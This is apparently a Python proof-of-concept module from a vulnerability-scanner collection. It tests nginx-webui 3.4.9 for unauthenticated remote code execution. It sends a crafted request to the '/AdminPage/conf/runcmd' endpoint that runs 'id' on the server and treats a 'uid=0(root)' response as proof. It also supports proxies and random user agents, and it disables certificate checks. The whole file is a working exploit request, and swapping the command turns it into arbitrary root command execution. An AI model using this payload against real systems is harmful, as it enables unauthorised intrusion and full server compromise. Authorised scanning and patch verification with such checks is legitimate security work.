import requests
import urllib.parse
import re
from fake_useragent import UserAgent


def get_info():
    # 漏洞基本信息
    return {
        "Name": "nginx-webui-3.4.9远程代码执行",
        "Attack": False,
        "Script": "nginx-webui_3.4.9RCE.py",
        "Path": "pocs/nginx-web_ui/nginx-webui_3.4.9.py",
        "version": "3.4.9",
        "about": None,
        "CVE": None
    }


def verify(url, proxy, ug):
    ua = UserAgent()
    useragent = ua.chrome
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) "
    }
    if ug:
        headers = {
            "User-Agent": useragent
        }
        print(headers)
    proxies = None
    # 判断是否指定proxy
    if proxy:
        proxies = {
            "http": proxy,
            "https": proxy
        }
    # 漏洞验证函数
    result = {
        'Name': 'nginx-webui-3.4.9远程代码执行',
        'Script': 'nginx-webui_3.4.9RCE.py',
        'url': url,
        'Attack': False,
        'vulnerable': False
    }

    timeout = 4
    payload = "/AdminPage/conf/runcmd?cmd=id%26%26echo%20nginx"
    full_url = urllib.parse.urljoin(url, payload)
    try:
        resp = requests.get(full_url, headers=headers, timeout=timeout, verify=False, proxies=proxies)
        if re.search("uid=0\(root\)", resp.text):
            result['vulnerable'] = True
            result['verify'] = full_url
        return result

    except requests.exceptions.RequestException as e:
        # print(e)
        return result


if __name__ == '__main__':
    pass
